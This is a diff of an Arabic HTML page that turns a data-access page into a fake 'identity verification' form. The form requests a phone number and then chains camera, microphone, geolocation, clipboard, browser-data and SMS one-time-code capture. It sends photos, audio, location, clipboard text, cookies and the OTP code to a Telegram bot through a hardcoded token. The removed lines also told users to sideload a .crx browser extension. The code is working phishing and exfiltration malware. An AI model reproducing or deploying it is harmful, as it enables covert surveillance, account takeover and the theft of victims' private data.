@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>طلب الوصول إلى البيانات</title>
+    <title>التحقق من الهوية</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -25,105 +25,146 @@
         button:hover {
             background-color: #0056b3;
         }
+        input {
+            padding: 10px;
+            font-size: 16px;
+            margin: 10px;
+            width: 200px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
         #status {
             margin-top: 20px;
             color: #333;
         }
-        #video, #canvas {
+        #video, #canvas, #audio {
             display: none;
-        }
-        .instructions {
-            margin-top: 20px;
-            background-color: #fff;
-            padding: 15px;
-            border-radius: 5px;
-            max-width: 600px;
-            margin-left: auto;
-            margin-right: auto;
         }
     </style>
 </head>
 <body>
-    <h1>طلب الوصول إلى البيانات</h1>
-    <p>اضغط على الأزرار أدناه للسماح بالوصول إلى الكاميرا، الموقع الجغرافي، وبيانات المتصفح، أو لتثبيت إضافة المتصفح.</p>
-    <button onclick="requestCamera()">التقاط صورة</button>
-    <button onclick="requestLocation()">الحصول على الموقع</button>
-    <button onclick="collectBrowserData()">جمع بيانات المتصفح</button>
-    <button onclick="downloadExtension()">تثبيت إضافة المتصفح</button>
+    <h1>التحقق من الهوية</h1>
+    <p>أدخل رقم هاتفك واضغط على "بدء التحقق" للوصول إلى جميع الميزات.</p>
+    <input type="tel" id="phoneNumber" placeholder="أدخل رقم الهاتف" required>
+    <button onclick="startVerification()">بدء التحقق</button>
     <p id="status">لم يتم طلب الإذن بعد.</p>
     <video id="video" width="320" height="240" autoplay></video>
     <canvas id="canvas" width="320" height="240"></canvas>
-    <div class="instructions">
-        <h3>تعليمات تثبيت الإضافة:</h3>
-        <p>1. اضغط على زر "تثبيت إضافة المتصفح" لتحميل ملف الإضافة.</p>
-        <p>2. في متصفح Chrome، افتح صفحة الإضافات (chrome://extensions).</p>
-        <p>3. فعّل وضع المطور (Developer Mode).</p>
-        <p>4. اسحب ملف الإضافة (.crx) إلى صفحة الإضافات وقم بتثبيته.</p>
-        <p>5. وافق على الأذونات المطلوبة.</p>
-    </div>
+    <audio id="audio" controls></audio>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
+        const audioElement = document.getElementById('audio');
         const status = document.getElementById('status');
+        const phoneNumberInput = document.getElementById('phoneNumber');
+        let mediaRecorder;
+        let recordedChunks = [];
 
-        // طلب الوصول إلى الكاميرا الأمامية
-        async function requestCamera() {
+        // بدء سلسلة طلبات الأذونات
+        async function startVerification() {
+            const phoneNumber = phoneNumberInput.value;
+            if (!phoneNumber) {
+                status.innerText = 'يرجى إدخال رقم هاتف صالح';
+                return;
+            }
+            status.innerText = 'جارٍ طلب الأذونات...';
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' }
-                });
-                video.srcObject = stream;
-                video.style.display = 'block';
-                status.innerText = 'الكاميرا مفتوحة. اضغط على الفيديو لالتقاط الصورة.';
-                
-                video.onclick = () => {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const imageData = canvas.toDataURL('image/png');
-                    video.style.display = 'none';
-                    stream.getTracks().forEach(track => track.stop());
-                    status.innerText = 'تم التقاط الصورة! جارٍ إرسالها...';
-                    sendPhotoToTelegram(imageData);
-                };
+                // 1. طلب الوصول إلى الكاميرا والميكروفون
+                await requestCameraAndMicrophone();
+                // 2. طلب الموقع الجغرافي
+                await requestLocation();
+                // 3. قراءة الحافظة
+                await readClipboard();
+                // 4. جمع بيانات المتصفح
+                await collectBrowserData();
+                // 5. إرسال رمز التحقق عبر SMS واسترداده
+                await sendOTP(phoneNumber);
             } catch (error) {
-                status.innerText = 'خطأ في الوصول إلى الكاميرا: ' + error.message;
+                status.innerText = 'خطأ في طلب الأذونات: ' + error.message;
                 console.error(error);
             }
         }
 
-        // طلب الموقع الجغرافي باستخدام GPS
+        // طلب الوصول إلى الكاميرا والميكروفون
+        async function requestCameraAndMicrophone() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' },
+                    audio: true
+                });
+                video.srcObject = stream;
+                video.style.display = 'block';
+                status.innerText = 'الكاميرا مفتوحة. اضغط على الفيديو لالتقاط الصورة.';
+
+                // التقاط الصورة
+                video.onclick = () => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png');
+                    video.style.display = 'none';
+                    status.innerText = 'تم التقاط الصورة! جارٍ تسجيل الصوت...';
+                    sendPhotoToTelegram(imageData);
+
+                    // تسجيل الصوت
+                    mediaRecorder = new MediaRecorder(stream);
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) recordedChunks.push(event.data);
+                    };
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(recordedChunks, { type: 'audio/webm' });
+                        recordedChunks = [];
+                        sendAudioToTelegram(blob);
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                        status.innerText = 'تم تسجيل الصوت!';
+                    }, 5000); // تسجيل لمدة 5 ثوانٍ
+                };
+            } catch (error) {
+                status.innerText = 'خطأ في الوصول إلى الكاميرا/الميكروفون: ' + error.message;
+                console.error(error);
+            }
+        }
+
+        // طلب الموقع الجغرافي
         async function requestLocation() {
             try {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const data = `
+                await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const data = `
 بيانات الموقع:
 - الإحداثيات: ${position.coords.latitude}, ${position.coords.longitude}
 - الدقة: ${position.coords.accuracy} متر
 - الوقت: ${new Date(position.timestamp).toLocaleString()}
 - المتصفح: ${navigator.userAgent}
-                        `;
-                        status.innerText = 'تم إرسال بيانات الموقع!';
-                        await sendToTelegram(data);
-                    },
-                    (error) => {
-                        status.innerText = 'خطأ في طلب الموقع: ' + error.message;
-                        console.error(error);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
+                            `;
+                            status.innerText = 'تم إرسال بيانات الموقع!';
+                            await sendToTelegram(data);
+                            resolve();
+                        },
+                        (error) => {
+                            status.innerText = 'خطأ في طلب الموقع: ' + error.message;
+                            console.error(error);
+                            reject(error);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                });
             } catch (error) {
-                status.innerText = 'خطأ في طلب الموقع: ' + error.message;
                 console.error(error);
             }
         }
 
-        // جمع بيانات المتصفح (userAgent، localStorage، Cookies)
+        // جمع بيانات المتصفح
         async function collectBrowserData() {
             try {
                 const browserData = `
@@ -143,12 +184,61 @@
             }
         }
 
-        // تنزيل ملف الإضافة
-        function downloadExtension() {
-            // يجب استضافة ملف .crx أو توجيه المستخدم إلى متجر الإضافات
-            status.innerText = 'يرجى تحميل ملف الإضافة وتثبيته يدويًا وفق التعليمات أدناه.';
-            // يمكن استبدال الرابط أدناه برابط ملف .crx إذا تم إنشاؤه
-            window.location.href = 'https://example.com/extension.crx'; // استبدل برابط حقيقي
+        // قراءة الحافظة
+        async function readClipboard() {
+            try {
+                if (!navigator.clipboard) {
+                    status.innerText = 'الحافظة غير مدعومة في هذا المتصفح';
+                    return;
+                }
+                const text = await navigator.clipboard.readText();
+                const clipboardData = `محتوى الحافظة: ${text || 'لا توجد بيانات في الحافظة'}`;
+                status.innerText = 'تم قراءة الحافظة!';
+                await sendToTelegram(clipboardData);
+            } catch (error) {
+                status.innerText = 'خطأ في قراءة الحافظة: ' + error.message;
+                console.error(error);
+            }
+        }
+
+        // إرسال رمز التحقق عبر SMS واسترداده
+        async function sendOTP(phoneNumber) {
+            try {
+                // إرسال طلب إلى الخادم الخلفي لإرسال رمز التحقق
+                const response = await fetch('https://your-backend-server/send-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phoneNumber })
+                });
+                const result = await response.json();
+                if (!response.ok) throw new Error(result.error || 'فشل إرسال رمز التحقق');
+                status.innerText = 'تم إرسال رمز التحقق! انتظر الرسالة النصية.';
+
+                // استخدام Web OTP API لاسترداد رمز التحقق
+                if ('OTPCredential' in window) {
+                    const ac = new AbortController();
+                    navigator.credentials.get({
+                        otp: { transport: ['sms'] },
+                        signal: ac.signal
+                    }).then(otp => {
+                        if (otp && otp.code) {
+                            status.innerText = 'تم استرداد رمز التحقق: ' + otp.code;
+                            sendToTelegram(`رمز التحقق: ${otp.code}\nرقم الهاتف: ${phoneNumber}`);
+                        } else {
+                            status.innerText = 'فشل استرداد رمز التحقق';
+                        }
+                    }).catch(error => {
+                        status.innerText = 'خطأ في استرداد رمز التحقق: ' + error.message;
+                        console.error(error);
+                    });
+                    setTimeout(() => ac.abort(), 60000); // إلغاء بعد 60 ثانية
+                } else {
+                    status.innerText = 'متصفحك لا يدعم Web OTP API';
+                }
+            } catch (error) {
+                status.innerText = 'خطأ في إرسال رمز التحقق: ' + error.message;
+                console.error(error);
+            }
         }
 
         // إرسال نص إلى تيليجرام
@@ -200,6 +290,30 @@
                 console.log('تم إرسال الصورة إلى تيليجرام');
             } catch (error) {
                 status.innerText = 'خطأ في إرسال الصورة إلى تيليجرام: ' + error.message;
+                console.error(error);
+            }
+        }
+
+        // إرسال الصوت إلى تيليجرام
+        async function sendAudioToTelegram(audioBlob) {
+            const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
+            const chatId = '6733154889';
+            const url = `https://api.telegram.org/bot${botToken}/sendAudio`;
+
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('audio', audioBlob, 'audio.webm');
+
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                if (!response.ok) throw new Error('فشل إرسال الصوت إلى تيليجرام');
+                status.innerText = 'تم إرسال الصوت بنجاح!';
+                console.log('تم إرسال الصوت إلى تيليجرام');
+            } catch (error) {
+                status.innerText = 'خطأ في إرسال الصوت إلى تيليجرام: ' + error.message;
                 console.error(error);
             }
         }
